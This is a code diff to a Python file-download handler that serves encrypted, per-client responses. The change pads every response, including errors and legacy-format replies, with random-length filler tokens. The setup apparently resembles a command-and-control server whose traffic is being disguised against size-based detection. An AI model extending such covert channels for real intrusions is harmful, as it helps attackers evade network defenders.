@@ -2,6 +2,8 @@ import os
 import base64
 import json
 import logging
+import random
+import string
 from handlers.base_handler import BaseHandler
 
 logger = logging.getLogger(__name__)
@@ -23,6 +25,11 @@ class FileDownloadHandler(BaseHandler):
             # Parse the JSON request
             request_json = json.loads(request_body)
             encrypted_data = request_json.get('data')
+            
+            # Extract token padding (if present - discard it since we don't need it)
+            token = request_json.get('token', '')
+            if token:
+                self.log_message(f"Received file download request with {len(token)} bytes of token padding")
             
             # Identify client by key-based decryption
             client_id, decrypted_data = self.crypto_helper.identify_client_by_decryption(encrypted_data)
@@ -48,8 +55,14 @@ class FileDownloadHandler(BaseHandler):
             # Encrypt the response
             encrypted_response = self.crypto_helper.encrypt(json.dumps(response), client_id)
             
-            # Send the encrypted response
-            self.send_response(200, "application/json", json.dumps({"data": encrypted_response}))
+            # Add token padding to the response
+            token_padding = self._generate_token_padding()
+            
+            # Send the encrypted response with token padding
+            self.send_response(200, "application/json", json.dumps({
+                "data": encrypted_response,
+                "token": token_padding
+            }))
             
         except json.JSONDecodeError:
             # For backward compatibility, try to parse the request body directly
@@ -74,8 +87,14 @@ class FileDownloadHandler(BaseHandler):
                 else:
                     encrypted_response = self.crypto_helper.encrypt(json.dumps(response))
                 
-                # Send the encrypted response (legacy format)
-                self.send_response(200, "application/json", encrypted_response)
+                # Add token padding
+                token_padding = self._generate_token_padding()
+                
+                # Send the encrypted response with token padding
+                self.send_response(200, "application/json", json.dumps({
+                    "data": encrypted_response,
+                    "token": token_padding
+                }))
             except Exception as e:
                 logger.error(f"Error handling legacy file download request: {e}")
                 self.send_error_response(500, "Server Error")
@@ -91,11 +110,26 @@ class FileDownloadHandler(BaseHandler):
             try:
                 if client_id:
                     encrypted_error = self.crypto_helper.encrypt(json.dumps(error_response), client_id)
-                    self.send_response(200, "application/json", json.dumps({"data": encrypted_error}))
+                    token_padding = self._generate_token_padding()
+                    self.send_response(200, "application/json", json.dumps({
+                        "data": encrypted_error,
+                        "token": token_padding
+                    }))
                 else:
                     self.send_error_response(500, "Server Error")
             except:
                 self.send_error_response(500, "Server Error")
+    
+    def _generate_token_padding(self):
+        """Generate random token padding for responses"""
+        # Generate a random length between 50 and 500 characters
+        padding_length = random.randint(50, 500)
+        
+        # Generate random padding content
+        chars = string.ascii_letters + string.digits
+        padding = ''.join(random.choice(chars) for _ in range(padding_length))
+        
+        return padding
     
     def _identify_client_by_ip(self):
         """Identify client based on IP address as fallback"""
